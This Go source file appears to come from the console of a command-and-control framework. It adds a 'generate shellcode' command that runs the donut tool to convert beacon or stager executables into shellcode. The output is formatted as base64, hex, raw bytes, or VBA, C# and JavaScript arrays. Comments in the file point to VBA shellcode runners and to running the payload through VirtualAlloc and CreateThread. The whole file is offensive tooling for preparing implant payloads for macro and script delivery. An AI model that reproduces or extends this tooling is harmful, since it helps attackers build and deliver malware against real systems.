package grumblecli

import (
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/desertbit/grumble"
	"google.golang.org/grpc"
)

func SetGenerateShellcodeCommand(conn grpc.ClientConnInterface) {
	generateShellcodeCmd := &grumble.Command{
		Name: "shellcode",
		Help: "convert stager or beacon to shellcode (base64, hex, VBA, C#, JavaScript)",
		Args: func(a *grumble.Args) {
			a.String("file", "path to PE file (stager or beacon EXE)")
		},
		Flags: func(f *grumble.Flags) {
			f.String("f", "format", "base64", "Output format: base64, hex, raw, vba, csharp, javascript")
			f.String("o", "output", "", "Output file (optional, defaults to stdout)")
		},
		Run: func(c *grumble.Context) error {
			peFile := c.Args.String("file")
			format := c.Flags.String("format")
			outputFile := c.Flags.String("output")

			if peFile == "" {
				fmt.Println("PE file path is required")
				return nil
			}

			if _, err := os.Stat(peFile); err != nil {
				fmt.Println("PE file not found:", peFile)
				return nil
			}

			validFormats := map[string]bool{
				"base64":     true,
				"hex":        true,
				"raw":        true,
				"vba":        true,
				"csharp":     true,
				"javascript": true,
			}

			if !validFormats[format] {
				fmt.Println("Invalid format. Valid options: base64, hex, raw, vba, csharp, javascript")
				return nil
			}

			shellcode, err := generateShellcode(peFile, format)
			if err != nil {
				fmt.Println("Shellcode generation failed:", err.Error())
				return nil
			}

			if outputFile != "" {
				var output interface{}
				if format == "raw" {
					output = shellcode
				} else {
					output = shellcode
				}

				var data []byte
				switch v := output.(type) {
				case string:
					data = []byte(v)
				case []byte:
					data = v
				}

				err := os.WriteFile(outputFile, data, 0644)
				if err != nil {
					fmt.Println("Failed to write output file:", err.Error())
					return nil
				}
				fmt.Println("[+] Shellcode saved to", outputFile)
				fmt.Println("[+] Size:", len(data), "bytes")
			} else {
				fmt.Println(shellcode)
			}

			return nil
		},
	}

	if cmd := app.Commands().Get("generate"); cmd != nil {
		cmd.AddCommand(generateShellcodeCmd)
		return
	}

	generateCmd := &grumble.Command{
		Name: "generate",
		Help: "generate beacon, stager, or shellcode",
	}
	generateCmd.AddCommand(generateShellcodeCmd)
	app.AddCommand(generateCmd)
}

func generateShellcode(peFile string, format string) (interface{}, error) {
	shellcode, err := peToShellcode(peFile)
	if err != nil {
		return nil, err
	}

	switch format {
	case "base64":
		return base64.StdEncoding.EncodeToString(shellcode), nil
	case "hex":
		return formatHex(shellcode), nil
	case "raw":
		return shellcode, nil
	case "vba":
		return formatVBA(shellcode), nil
	case "csharp":
		return formatCSharp(shellcode), nil
	case "javascript":
		return formatJavaScript(shellcode), nil
	default:
		return nil, fmt.Errorf("unknown format: %s", format)
	}
}

func peToShellcode(peFile string) ([]byte, error) {
	tmpBin := filepath.Join(os.TempDir(), "shellcode_tmp.bin")
	defer os.Remove(tmpBin)

	donutPath := "tools/donut"
	cmd := exec.Command(donutPath, "-i", peFile, "-o", tmpBin)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Run(); err != nil {
		return nil, fmt.Errorf("donut conversion failed: %w", err)
	}

	shellcode, err := os.ReadFile(tmpBin)
	if err != nil {
		return nil, fmt.Errorf("failed to read shellcode: %w", err)
	}

	return shellcode, nil
}

func formatHex(shellcode []byte) string {
	var result string
	for i, b := range shellcode {
		if i > 0 && i%32 == 0 {
			result += "\n"
		}
		result += fmt.Sprintf("%02x", b)
	}
	return result
}

func formatVBA(shellcode []byte) string {
	var output strings.Builder
	output.WriteString("Dim shellcode() As Byte\n")
	output.WriteString("shellcode = Array(\n")

	for i, b := range shellcode {
		if i > 0 && i%16 == 0 {
			output.WriteString("\n")
		}
		if i > 0 && i%16 != 0 {
			output.WriteString(", ")
		}
		fmt.Fprintf(&output, "&H%02X", b)
	}

	output.WriteString("\n)\n")
	output.WriteString("' Paste into VBA shellcode runner: https://github.com/...\n")

	return output.String()
}

func formatCSharp(shellcode []byte) string {
	var output strings.Builder
	output.WriteString("byte[] shellcode = new byte[] {\n")

	for i, b := range shellcode {
		if i > 0 && i%16 == 0 {
			output.WriteString("\n")
		}
		if i > 0 && i%16 != 0 {
			output.WriteString(", ")
		}
		fmt.Fprintf(&output, "0x%02X", b)
	}

	output.WriteString("\n};\n")
	output.WriteString("// Execute with: VirtualAlloc() + CreateThread()\n")

	return output.String()
}

func formatJavaScript(shellcode []byte) string {
	var output strings.Builder
	output.WriteString("var shellcode = [\n")

	for i, b := range shellcode {
		if i > 0 && i%16 == 0 {
			output.WriteString("\n")
		}
		if i > 0 && i%16 != 0 {
			output.WriteString(", ")
		}
		fmt.Fprintf(&output, "0x%02X", b)
	}

	output.WriteString("\n];\n")
	output.WriteString("// Execute with: WScript.Shell or similar JS runner\n")

	return output.String()
}
